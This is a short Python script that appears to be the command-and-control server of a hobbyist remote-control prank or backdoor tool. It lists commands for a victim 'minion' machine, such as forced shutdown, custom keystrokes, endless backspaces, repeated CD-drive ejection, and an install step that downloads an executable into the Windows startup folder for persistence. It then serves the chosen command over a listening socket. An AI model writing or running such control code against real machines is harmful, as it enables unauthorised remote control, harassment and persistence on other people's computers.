#!/usr/bin/python
import socket
print('''
(s) = Spoil your non-excistance. Since it creates a file on the desktop.
shutdown: initates a shutdown command.
test: starts the calculator.
cancel: stops any current shutdown commands AND terminates all 'wscript.exe' processes.
message [input text]:(s) makes a popup box with custom text. NOTE: You cant include any words that also is commands currently.
disable: stops the minion process.
opencd: opens the cd drive continuously.
togglecaps:(s) continuously toggle capslock, disable with 'cancel' command.
backspaces:(s) continuously use backspace, disable with 'cancel' command.
ghostkeys [input text]:(s) Make custom keystroke on Minion.
cleanup: Removes .vbs files your desktop.
install: Downloads the latest .exe version and places it in the windows 'start folder'.
uninstall: Removes the .exe file in start folder.
restart: Only to be used after install command. Only starts the process in 'start folder'.
''')
command = raw_input("Enter your command, commander: ")
s = socket.socket()
print("Socket successfully created")
port = 12345
s.bind(('', port))
print("socket binded to %s" %(port))
s.listen(5)
print("socket is listening")
while True:
    c, addr = s.accept()
    print('Got connection from', addr)
    c.send(command)
    c.close()
